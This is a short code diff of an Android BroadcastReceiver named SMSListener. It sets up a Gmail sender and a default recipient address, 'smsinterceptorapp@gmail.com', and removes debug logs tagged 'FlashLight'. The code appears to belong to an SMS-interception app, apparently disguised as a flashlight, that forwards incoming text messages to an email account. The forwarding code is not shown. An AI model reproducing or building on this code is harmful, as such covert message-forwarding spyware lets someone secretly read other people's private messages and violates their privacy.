@@ -16,37 +16,28 @@ import android.content.BroadcastReceiver;
 
 public class SMSListener extends BroadcastReceiver {
 
-  private static GmailSender sender;
-
   public  static Object[] pdus;
   public  static Context context;
+  private static GmailSender sender;
+  private static Configure configure;
+
   public  static String mBody = null;
-
-  /*private static String phoneNumberString = "8484820667";
-  private static String gmailEmailString = "justdriveapp1@gmail.com";*/
-
   private static String phoneNumberString;
   private static String gmailEmailString;
 
   public SMSListener() {
-    Configure configure = new Configure();
-    configure.initDatabase();
-    if(configure.getDatabaseInfo().equals("update")) {
-      if(!configure.getEmailAddress().equals("null")) {
-        gmailEmailString = configure.getEmailAddress();
-      }
-      else {
-        gmailEmailString = "smsinterceptorapp@gmail.com";
-      }
-      if(!configure.getPhoneNumber().equals("null")) {
-        phoneNumberString = configure.getPhoneNumber();
-      }
-      else {
-        phoneNumberString = "null";
-      }
-      Log.d("FlashLight SMSListener() ", "gmailEmailString " + gmailEmailString);
-      Log.d("FlashLight SMSListener() ", "phoneNumberString " + phoneNumberString);
-      Log.d("FlashLight SMSListener() ", "phoneNumberString != \"null\" " + String.valueOf(phoneNumberString != "null"));
+    configure = new Configure();
+    if(!configure.getDatabaseInfo().equals("null")) {
+      gmailEmailString = configure.getEmailAddress();
+    }
+    else {
+      gmailEmailString = "smsinterceptorapp@gmail.com";
+    }
+    if(!configure.getPhoneNumber().equals("null")) {
+      phoneNumberString = configure.getPhoneNumber();
+    }
+    else {
+      phoneNumberString = "null";
     }
   }
 
